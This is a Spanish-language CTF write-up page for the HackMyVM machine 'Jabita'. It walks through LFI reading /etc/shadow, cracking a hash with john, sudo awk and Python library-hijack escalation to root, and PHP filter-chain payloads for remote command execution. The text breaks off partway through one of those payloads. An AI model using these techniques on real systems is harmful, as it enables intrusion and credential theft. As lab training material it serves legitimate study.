@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackMyVM Jabita</title>
+
+  <meta name="description" content="Resolución de la máquina Jabita de la plataforma de HackMyVM">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackMyVM Jabita">
+  <meta name="twitter:description" content="Resolución de la máquina Jabita de la plataforma de HackMyVM">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/otros/hackmyvm.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackMyVM Jabita">
+  <meta property="og:description" content="Resolución de la máquina Jabita de la plataforma de HackMyVM">
+  <meta property="og:image" content="/images/otros/hackmyvm.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/hackmyvm.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackMyVM Jabita" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hmv" title="GatoGamer1155" class="blog-button">HackMyVM</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-jack">Shell - jack</a></li>
+        <li><a href="#shell-jaba">Shell - jaba</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+        <li><a href="#shell-www-data">Extra</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackMyVM</h4>
+    <picture><img src="/images/otros/hackmyvm.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Jabita</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo 2 puertos abiertos, donde corren los servicios <code class="language-plaintext highlighter-rouge">ssh</code> y <code class="language-plaintext highlighter-rouge">http</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.33
+Nmap scan report for 192.168.100.33  
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La página principal no tiene realmente nada interesante, solo un simple texto</p>
+<a href="/hmv/jabita/1.png" target="_blank"><div><p><img src="/hmv/jabita/1.png"></p></div></a>
+
+<p class="plain-text">Aplicando fuerza bruta con <code class="language-plaintext highlighter-rouge">wfuzz</code> podemos llegar a descubrir un directorio llamado <code class="language-plaintext highlighter-rouge">building</code> el cual nos devuelve un codigo de estado <code class="language-plaintext highlighter-rouge">301</code> que es un redirect</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.100.33/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.100.33/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000004227:   </span><span class="ro">403</span><span class="p">        9 L      28 W       279 Ch      "server-status"
+000004302:   </span><span class="az">301</span><span class="p">        9 L      28 W       319 Ch      "building"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al solo entrar a este directorio llama la atención el como se gestionan las diferentes ventanas, lo hace desde un parametro <code class="language-plaintext highlighter-rouge">page</code> por GET que recibe el nombre del <code class="language-plaintext highlighter-rouge">php</code></p>
+<a href="/hmv/jabita/2.png" target="_blank"><div><p><img src="/hmv/jabita/2.png"></p></div></a>
+
+<p class="plain-text">Podemos probar un <code class="language-plaintext highlighter-rouge">LFI</code> aprovechando este parametro para apuntar a archivos de la maquina, al apuntar al /etc/passwd con <code class="language-plaintext highlighter-rouge">?page=/etc/passwd</code> vemos su contenido</p>
+<a href="/hmv/jabita/3.png" target="_blank"><div><p><img src="/hmv/jabita/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-jack">
+<br><h3 class="post-title">Shell - jack</h3><br>
+
+<p class="plain-text">Para ver mejor el contenido los archivos desde la terminal usaremos <code class="language-plaintext highlighter-rouge">curl</code>, ademas con <code class="language-plaintext highlighter-rouge">tail</code> podemos eliminar las primeras 13 lineas que son el <code class="language-plaintext highlighter-rouge">HTML</code> de la pagina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://192.168.100.33/building/index.php?page=/etc/passwd"</span><span class="p"> | </span><span class="ve">tail</span><span class="p"> -n +14
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+jack:x:1001:1001::/home/jack:/bin/bash
+jaba:x:1002:1002::/home/jaba:/bin/bash</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de probar varios archivos podemos ver que el archivo <code class="language-plaintext highlighter-rouge">/etc/shadow</code> que almacena los <code class="language-plaintext highlighter-rouge">hashes</code> de los usuarios tiene permisos de <code class="language-plaintext highlighter-rouge">lectura</code> para todos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://192.168.100.33/building/index.php?page=/etc/shadow"</span><span class="p"> | </span><span class="ve">tail</span><span class="p"> -n +14
+root:$y$j9T$avXO7BCR5/iCNmeaGmMSZ0$gD9m7w9/zzi1iC9XoaomnTHTp0vde7smQL1eYJ1V3u1:19240:0:99999:7:::
+daemon:*:19213:0:99999:7:::
+bin:*:19213:0:99999:7:::
+sys:*:19213:0:99999:7:::
+sync:*:19213:0:99999:7:::
+games:*:19213:0:99999:7:::
+man:*:19213:0:99999:7:::
+lp:*:19213:0:99999:7:::
+mail:*:19213:0:99999:7:::
+news:*:19213:0:99999:7:::
+uucp:*:19213:0:99999:7:::
+proxy:*:19213:0:99999:7:::
+www-data:*:19213:0:99999:7:::
+backup:*:19213:0:99999:7:::
+list:*:19213:0:99999:7:::
+irc:*:19213:0:99999:7:::
+gnats:*:19213:0:99999:7:::
+nobody:*:19213:0:99999:7:::
+_apt:*:19213:0:99999:7:::
+systemd-network:*:19213:0:99999:7:::
+systemd-resolve:*:19213:0:99999:7:::
+messagebus:*:19213:0:99999:7:::
+systemd-timesync:*:19213:0:99999:7:::
+pollinate:*:19213:0:99999:7:::
+sshd:*:19213:0:99999:7:::
+syslog:*:19213:0:99999:7:::
+uuidd:*:19213:0:99999:7:::
+tcpdump:*:19213:0:99999:7:::
+tss:*:19213:0:99999:7:::
+landscape:*:19213:0:99999:7:::
+usbmux:*:19236:0:99999:7:::
+lxd:!:19236::::::
+jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7:::  
+jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Hay un hash diferente que inicia por <code class="language-plaintext highlighter-rouge">$6$</code>, este formato <code class="language-plaintext highlighter-rouge">SHA512</code> es posible de crackear, aplicando fuerza bruta con <code class="language-plaintext highlighter-rouge">john</code> podemos obtener la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 XOP 2x])  
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">joaninha</span><span class="p">         (</span><span class="am">jack</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como es una <code class="language-plaintext highlighter-rouge">contraseña</code> valida en el sistema podemos usarla para autenticarnos hacia <code class="language-plaintext highlighter-rouge">ssh</code> como el usuario <code class="language-plaintext highlighter-rouge">jack</code> y obtener una shell como este en la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">jack@192.168.100.33
+jack@192.168.100.33's password: joaninha
+</span><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1001(jack) gid=1001(jack) groups=1001(jack)  
+</span><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.33
+</span><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-jaba">
+<br><h3 class="post-title">Shell - jaba</h3><br>
+
+<p class="plain-text">Al mirar los privilegios de <code class="language-plaintext highlighter-rouge">sudoers</code> encontramos que podemos ejecutar como el usuario <code class="language-plaintext highlighter-rouge">jaba</code> sin la necesidad de proporcionar una contraseña el comando <code class="language-plaintext highlighter-rouge">awk</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
+Matching Defaults entries for jack on jabita:
+    secure_path=/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+
+User jack may run the following commands on jabita:
+    (jaba : jaba) NOPASSWD: /usr/bin/awk
+</span><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos apoyarnos de <a href="https://gtfobins.github.io/gtfobins/awk/#sudo">gtfobins</a> que nos muestra una forma mediante la cual podemos ejecutar un comando con <code class="language-plaintext highlighter-rouge">system</code>, podemos ejecutar una <code class="language-plaintext highlighter-rouge">bash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jack@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -u jaba awk 'BEGIN{system("/bin/bash")}'  
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+192.168.100.33
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
+2e0942f09699435811c1be613cbc7a39
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Ya como el usuario <code class="language-plaintext highlighter-rouge">jaba</code> tenemos un nuevo privilegio a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>, y es el ejecutar como <code class="language-plaintext highlighter-rouge">root</code> con el comando python3 un script llamado <code class="language-plaintext highlighter-rouge">clean.py</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
+Matching Defaults entries for jaba on jabita:
+    secure_path=/usr/local/bin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
+
+User jaba may run the following commands on jabita:
+    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El script es bastante sencillo, importa una libreria personalizada llamada <code class="language-plaintext highlighter-rouge">wild</code> y despues llama a la función <code class="language-plaintext highlighter-rouge">first()</code> que parece que viene integrada en esta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/bin/clean.py  
+import wild
+
+wild.first()
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando la libreria sys podemos ver el <code class="language-plaintext highlighter-rouge">path</code> de donde toma las librerias python, asi encontramos el script de la libreria que es <code class="language-plaintext highlighter-rouge">wild.py</code>, en el cual al revisar los privilegios otros tienen <code class="language-plaintext highlighter-rouge">rw-</code> lo que quiere decir que cualquier usuario puede escribir en este</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ python3 -q
+>>> import sys
+>>> sys.path
+['', '/usr/lib/python310.zip', '/usr/lib/python3.10', '/usr/lib/python3.10/lib-dynload', '/usr/local/lib/python3.10/dist-packages', '/usr/lib/python3/dist-packages']  
+>>> exit()
+</spane><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/lib/python3.10/wild.py
+-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py  
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Modificamos el script para que a traves de <code class="language-plaintext highlighter-rouge">os.system</code> nos ejecute el comando <code class="language-plaintext highlighter-rouge">bash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ echo "import os; os.system('bash')" > /usr/lib/python3.10/wild.py  
+</span><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el script <code class="language-plaintext highlighter-rouge">clean.py</code> este importara la libreria wild que nos ejecutara una <code class="language-plaintext highlighter-rouge">bash</code> y bajo el contexto de sudo esta sera como el usuario <code class="language-plaintext highlighter-rouge">root</code>, leemos la flag</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">jaba@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo python3 /usr/bin/clean.py  
+</span><span class="ve">root@jabita</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@jabita</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+192.168.100.33
+</span><span class="ve">root@jabita</span><span class="p">:</span><span class="az">~</span><span class="p"># cat root.txt
+f4bb4cce1d4ed06fc77ad84ccf70d3fe
+</span><span class="ve">root@jabita</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-www-data">
+<br><h3 class="post-title">Shell - www-data</h3><br>
+
+<p class="plain-text">Una via probablemente no intencionada para obtener una revshell como <code class="language-plaintext highlighter-rouge">www-data</code> es mediante filter chain, podemos usar un <a href="https://github.com/synacktiv/php_filter_chain_generator">script</a> que lo automatiza para crear un payload que haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">system</code> de php nos ejecute el comando <code class="language-plaintext highlighter-rouge">id</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain </span><span class="am">'&lt?php system("id"); ?>'</span><span class="p">
+[+] The following gadget chain will generate the following code : &lt?php system("id"); ?> (base64 value: PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar este payload en el paramero <code class="language-plaintext highlighter-rouge">page</code> la web interpreta el php y al ejecutar el comando system nos muestra como output que lo ejecuta el usuario <code class="language-plaintext highlighter-rouge">www-data</code></p>
+<a href="/hmv/jabita/4.png" target="_blank"><div><p><img src="/hmv/jabita/4.png"></p></div></a>
+
+<p class="plain-text">Sabemos que ejecuta comandos, para controlar el <code class="language-plaintext highlighter-rouge">comando</code> podemos crear un payload que ejecute lo que reciba mediante el parametro <code class="language-plaintext highlighter-rouge">cmd</code> por el metodo GET</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain </span><span class="am">'&lt?php system($_GET["cmd"]); ?>'</span><span class="p">
+[+] The following gadget chain will generate the following code : &lt?php system($_GET["cmd"]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.i